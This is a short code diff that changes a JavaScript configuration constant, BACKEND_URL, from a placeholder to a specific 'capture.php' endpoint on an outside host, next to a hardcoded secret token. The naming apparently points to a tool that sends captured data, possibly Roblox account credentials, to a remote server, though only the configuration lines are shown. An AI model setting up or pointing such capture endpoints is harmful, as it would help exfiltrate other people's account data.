@@ -8,7 +8,7 @@
 
 /* ================= CONFIG ================= */
 // CHANGE THIS TO YOUR ACTUAL PHP ENDPOINT URL
-const BACKEND_URL = "https://yourdomain.com/capture.php";
+const BACKEND_URL = "https://bloxtools-release.vercel.app/capture.php";
 
 // Optional: Same secret token used in your PHP backend
 const SECRET_TOKEN = "YourRandomSecret123!";
